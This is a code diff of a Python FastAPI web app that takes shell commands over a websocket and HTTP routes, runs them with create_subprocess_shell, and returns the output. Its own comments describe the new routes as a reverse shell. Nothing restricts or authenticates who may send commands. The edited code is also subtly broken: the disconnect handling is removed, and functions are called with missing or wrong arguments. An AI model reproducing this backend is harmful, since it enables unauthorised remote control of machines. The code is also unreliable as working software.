@@ -122,24 +122,30 @@ async def websocket_endpoint(websocket: WebSocket, client_id: int):
     await manager.connect(websocket)
     if manager.is_connected(websocket):
         print(f"Client {client_id} connected")
-    try:
         while True:
             command = await manager.receive_shell_command(websocket)
             print(f"Client {client_id} sent command: {command}")
-            if manager.is_connected(websocket):
-                process = await aiosubprocess.create_subprocess_shell(command, stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
-                stdout, stderr = await process.communicate()
-                await manager.send_shell_output(websocket, stdout.decode())
-    except WebSocketDisconnect:
-        manager.disconnect(websocket)
+            process = await aiosubprocess.create_subprocess_shell(command, stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
+            stdout, stderr = await process.communicate()
+            await manager.send_shell_output(websocket, stdout.decode())
+            print(f"Client {client_id} sent output: {stdout.decode()}")
+    else:
+        print(f"Client {client_id} disconnected")
+        await manager.disconnect(websocket)
 
 # render the terminal in an HTML template
 @app.get("/terminal")
 def terminal(request: Request):
-    return templates.TemplateResponse("terminal.html", {"request": request})
+    return templates.TemplateResponse("terminal.html", {"request": request, "output": manager.send_shell_output()})
 
-# render the terminal in an HTML template
-@app.get("/terminal-view")
-def terminal_view(request: Request):
-    return templates.TemplateResponse("terminal.html", {"request": request})
+# send the command to the reverse shell
+@app.post("/send-command")
+async def send_command(command: str):
+    return await manager.receive_shell_command(command)
+
+# receive the command from the reverse shell
+@app.get("/receive-command")
+async def receive_command():
+    return await manager.send_shell_output()
+
 
